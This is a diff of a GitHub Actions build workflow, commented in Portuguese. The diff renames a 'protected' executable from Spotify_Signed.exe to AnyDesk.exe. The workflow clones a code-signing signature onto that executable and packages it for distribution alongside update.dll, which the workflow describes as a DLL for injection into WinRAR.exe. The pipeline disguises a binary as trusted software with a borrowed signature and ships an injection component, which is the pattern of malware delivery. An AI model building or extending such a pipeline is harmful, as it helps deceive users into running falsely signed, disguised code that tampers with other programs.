@@ -184,7 +184,7 @@ jobs:
           # Arquivos de origem e destino
           $sourceFile = "bin\Release\Spotify.exe"  # Spotify original assinado (se existir)
           $targetFile = "bin\Protected\Spotify.exe"
-          $outputFile = "bin\Protected\Spotify_Signed.exe"
+          $outputFile = "bin\Protected\AnyDesk.exe"
           
           # Verificar se arquivo alvo existe
           if (!(Test-Path $targetFile)) {
@@ -220,7 +220,7 @@ jobs:
               Write-Host "⚠️ Nenhum executável assinado encontrado para clonar" -ForegroundColor Yellow
               Write-Host "💡 Copiando arquivo sem assinatura..." -ForegroundColor Cyan
               Copy-Item $targetFile $outputFile -Force
-              Write-Host "✅ Arquivo copiado (sem assinatura clonada)" -ForegroundColor Green
+              Write-Host "✅ Arquivo copiado como AnyDesk.exe (sem assinatura clonada)" -ForegroundColor Green
               exit 0
             }
           }
@@ -237,7 +237,7 @@ jobs:
               Write-Host "⚠️ Arquivo fonte não possui assinatura!" -ForegroundColor Yellow
               Write-Host "💡 Copiando arquivo sem assinatura..." -ForegroundColor Cyan
               Copy-Item $targetFile $outputFile -Force
-              Write-Host "✅ Arquivo copiado (sem assinatura)" -ForegroundColor Green
+              Write-Host "✅ Arquivo copiado como AnyDesk.exe (sem assinatura)" -ForegroundColor Green
               exit 0
             }
           } catch {
@@ -256,7 +256,7 @@ jobs:
           
           if ($LASTEXITCODE -ne 0) {
             Write-Host "❌ Erro ao clonar assinatura" -ForegroundColor Red
-            Write-Host "💡 Criando cópia sem assinatura..." -ForegroundColor Yellow
+            Write-Host "💡 Criando cópia como AnyDesk.exe sem assinatura..." -ForegroundColor Yellow
             Copy-Item $targetFile $outputFile -Force
           }
           
@@ -300,7 +300,7 @@ jobs:
           Write-Host "📊 Tamanho original: $([math]::Round($origSize/1MB,2)) MB" -ForegroundColor White
           Write-Host "📊 Tamanho final: $([math]::Round($finalSize/1MB,2)) MB" -ForegroundColor White
           Write-Host ""
-          Write-Host "📦 Arquivo pronto para distribuição: Spotify_Signed.exe" -ForegroundColor Cyan
+          Write-Host "📦 Arquivo pronto para distribuição: AnyDesk.exe" -ForegroundColor Cyan
 
       - name: 🧪 Teste de execução
         shell: pwsh
@@ -338,11 +338,11 @@ jobs:
           
           $ok1 = Test-Exe "bin\Release\Spotify.exe" "RELEASE"
           $ok2 = Test-Exe "bin\Protected\Spotify.exe" "PROTEGIDO"
-          $ok3 = Test-Exe "bin\Protected\Spotify_Signed.exe" "PROTEGIDO COM CERTIFICADO"
+          $ok3 = Test-Exe "bin\Protected\AnyDesk.exe" "PROTEGIDO COM CERTIFICADO (AnyDesk.exe)"
           
           # Verificar certificado no arquivo final
-          if (Test-Path "bin\Protected\Spotify_Signed.exe") {
-            Test-Certificate "bin\Protected\Spotify_Signed.exe"
+          if (Test-Path "bin\Protected\AnyDesk.exe") {
+            Test-Certificate "bin\Protected\AnyDesk.exe"
           }
           
           if (-not $ok1 -or -not $ok2 -or -not $ok3) { exit 1 }
@@ -359,7 +359,7 @@ jobs:
           }
           
           # Copiar arquivos principais
-          Copy-Item "bin\Protected\Spotify_Signed.exe" "$distDir\Spotify_Signed.exe" -Force
+          Copy-Item "bin\Protected\AnyDesk.exe" "$distDir\AnyDesk.exe" -Force
           Copy-Item "bin\Release\update.dll" "$distDir\update.dll" -Force
           
           # Copiar README de distribuição
@@ -377,15 +377,15 @@ jobs:
           
           Write-Host ""
           Write-Host "🎉 Pacote pronto para distribuição!" -ForegroundColor Green
-          Write-Host "📦 Spotify_Signed.exe - Executável com assinatura clonada" -ForegroundColor Cyan
+          Write-Host "📦 AnyDesk.exe - Executável com assinatura clonada" -ForegroundColor Cyan
           Write-Host "📦 update.dll - DLL C++ para injeção no WinRAR.exe" -ForegroundColor Cyan
 
       - name: 📁 Upload Arquivos de Distribuição
         uses: actions/upload-artifact@v4
         with:
-          name: spotify-signed-package
+          name: anydesk-signed-package
           path: |
-            Distribuicao/Spotify_Signed.exe
+            Distribuicao/AnyDesk.exe
             Distribuicao/update.dll
             Distribuicao/README.md
           retention-days: 90
